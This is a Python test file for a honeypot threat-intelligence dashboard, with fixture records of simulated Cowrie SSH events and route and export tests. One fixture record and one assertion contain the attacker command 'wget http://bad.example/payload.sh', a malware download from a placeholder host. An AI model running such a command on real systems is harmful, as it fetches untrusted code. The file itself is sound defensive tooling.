from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from honeypot_pipeline.dashboard import create_app
from honeypot_pipeline.dashboard_data import filter_records, load_dataset
from honeypot_pipeline.reporting import collect_blocklist_ips, get_malicious_records


def _write_records(path: Path) -> None:
    records = [
        {
            "timestamp": "2026-03-18T12:05:00.000000Z",
            "event_type": "cowrie.command.input",
            "source_ip": "198.51.100.24",
            "username": "root",
            "password": "toor",
            "session_id": "abc124",
            "command": "wget http://bad.example/payload.sh",
            "url": "http://bad.example/payload.sh",
            "protocol": "ssh",
            "classification": {
                "attack_category": "malware_download",
                "severity": "high",
            },
            "threat_intel": {
                "status": "completed",
                "score": {
                    "is_malicious": True,
                    "confidence": "high",
                },
            },
            "raw_event": {
                "eventid": "cowrie.command.input",
            },
        },
        {
            "timestamp": "2026-03-18T12:00:00.000000Z",
            "event_type": "cowrie.login.failed",
            "source_ip": "203.0.113.10",
            "username": "admin",
            "password": "admin",
            "session_id": "abc123",
            "command": "",
            "url": None,
            "protocol": "ssh",
            "classification": {
                "attack_category": "brute_force",
                "severity": "medium",
            },
            "threat_intel": {
                "status": "completed",
                "score": {
                    "is_malicious": False,
                    "confidence": "low",
                },
            },
            "raw_event": {
                "eventid": "cowrie.login.failed",
            },
        },
    ]

    with path.open("w", encoding="utf-8") as handle:
        handle.write(json.dumps(records[0]))
        handle.write("\n")
        handle.write("not-json\n")
        handle.write(json.dumps(records[1]))
        handle.write("\n")


class DashboardDataTests(unittest.TestCase):
    def test_load_dataset_skips_malformed_lines_and_derives_summary(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)

            dataset = load_dataset(records_path)

        self.assertEqual(dataset.skipped_lines, 1)
        self.assertEqual(len(dataset.records), 2)
        self.assertEqual(dataset.records[0]["source_ip"], "198.51.100.24")
        self.assertEqual(dataset.summary["total_events"], 2)

    def test_filter_records_respects_filters(self) -> None:
        records = [
            {
                "source_ip": "198.51.100.24",
                "event_type": "cowrie.command.input",
                "protocol": "ssh",
                "classification": {"attack_category": "malware_download"},
                "threat_intel": {"score": {"is_malicious": True}},
            },
            {
                "source_ip": "203.0.113.10",
                "event_type": "cowrie.login.failed",
                "protocol": "ssh",
                "classification": {"attack_category": "brute_force"},
                "threat_intel": {"score": {"is_malicious": False}},
            },
        ]

        filtered = filter_records(
            records,
            attack_category="malware_download",
            malicious_only=True,
        )

        self.assertEqual(len(filtered), 1)
        self.assertEqual(filtered[0]["source_ip"], "198.51.100.24")

    def test_reporting_helpers_collect_malicious_records_and_blocklist(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            dataset = load_dataset(records_path)

        malicious_records = get_malicious_records(dataset.records)
        blocklist_ips = collect_blocklist_ips(dataset.records)

        self.assertEqual(len(malicious_records), 1)
        self.assertEqual(blocklist_ips, ["198.51.100.24"])


class DashboardRouteTests(unittest.TestCase):
    def test_overview_route_renders(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/")

        self.assertEqual(response.status_code, 200)
        html = response.get_data(as_text=True)
        self.assertIn("Overview", html)
        self.assertIn("Skipped Malformed Lines", html)
        self.assertIn("1", html)
        self.assertIn("wget http://bad.example/payload.sh", html)

    def test_events_route_applies_filters(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/events?source_ip=203.0.113.10&refresh=3")

        self.assertEqual(response.status_code, 200)
        html = response.get_data(as_text=True)
        self.assertIn("203.0.113.10", html)
        self.assertNotIn("198.51.100.24", html)
        self.assertIn("Auto-refresh every 3 seconds", html)

    def test_detail_route_shows_event_data(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/events/1")

        self.assertEqual(response.status_code, 200)
        html = response.get_data(as_text=True)
        self.assertIn("Event Detail", html)
        self.assertIn("malware_download", html)
        self.assertIn("confidence", html)
        self.assertIn("Indicators", html)
        self.assertIn("Threat Intel", html)

    def test_export_routes_return_downloadable_outputs(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                blocklist_response = client.get("/exports/blocklist.txt")
                malicious_response = client.get("/exports/malicious.json")
                report_response = client.get("/exports/report.md")

        self.assertEqual(blocklist_response.status_code, 200)
        self.assertIn("198.51.100.24", blocklist_response.get_data(as_text=True))
        self.assertEqual(malicious_response.status_code, 200)
        self.assertIn("\"malicious_record_count\": 1", malicious_response.get_data(as_text=True))
        self.assertEqual(report_response.status_code, 200)
        self.assertIn("# Honeypot Threat Intelligence Report", report_response.get_data(as_text=True))


if __name__ == "__main__":
    unittest.main()
